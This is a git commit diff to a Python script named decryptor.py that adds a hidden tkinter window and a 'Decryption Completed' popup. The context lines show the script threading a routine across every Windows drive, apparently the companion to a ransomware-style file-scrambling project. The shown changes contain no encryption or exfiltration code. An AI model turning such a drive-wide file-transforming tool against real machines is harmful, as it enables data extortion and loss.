cd338ab843590b8d1004c5b8caceab9284c58996
Shubham Vishwakarma <43336210+Shubhamvis98@users.noreply.github.com>
2020-07-10 21:54:13 +0530

    added popup at end

--- decryptor.py
+++ decryptor.py
@@ -1,8 +1,12 @@
-import base64
-import sys, os
+import base64, os, tkinter
+from tkinter import messagebox as msg
 from threading import Thread as thread
 from os import rename as rn
 from os import system as cmd
+
+# hide main window
+maingui = tkinter.Tk()
+maingui.withdraw()
 
 # clear screen
 if os.name == 'nt':
@@ -50,3 +54,5 @@ drives = [d+':\\' for d in dr if os.path.exists(f'{d}:')]
 for i in drives:
     #driverun(i)
     thread(target=driverun, args=(i,)).start()
+
+msg.showinfo(title='Decryptor',message='Decryption Completed')
